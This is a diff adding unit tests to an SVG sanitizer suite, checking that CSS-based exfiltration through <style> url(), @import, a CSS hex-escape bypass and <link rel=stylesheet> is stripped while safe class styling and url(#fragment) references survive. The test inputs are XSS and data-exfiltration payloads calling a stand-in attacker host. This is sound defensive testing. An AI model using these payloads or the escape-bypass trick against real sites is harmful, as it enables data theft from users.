@@ -946,6 +946,35 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
     return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
   }},
+  // CSS-text exfil: <style>/<link> inside SVG fire an outbound GET via url() /
+  // @import / rel=stylesheet with no CSP backstop. We filter <style> textContent
+  // (preserve legitimate class-based styling and url(#fragment) refs that
+  // Mermaid/Vera diagrams need), and block <link> outright.
+  { name: "SVG <style> with external url() removed (exfil blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @import removed (exfil blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/@import/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> with CSS \\XX escape removed (escape-bypass blocked)", fn: async () => {
+    // \75rl(...) decodes to url(...) in the CSS parser — escape-token bypass
+    const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> with safe class CSS preserved (Mermaid/Vera compat)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
+    return /<style/i.test(out) && /#3b82f6/.test(out) && /\.node/.test(out);
+  }},
+  { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
+    return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
+  }},
+  { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
+    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
+    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
+  }},
   // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
   // dangerouslySetInnerHTML does, and assert no live event handler materializes.
   { name: "CDATA-in-style mXSS round-trip neutralized", fn: async () => {
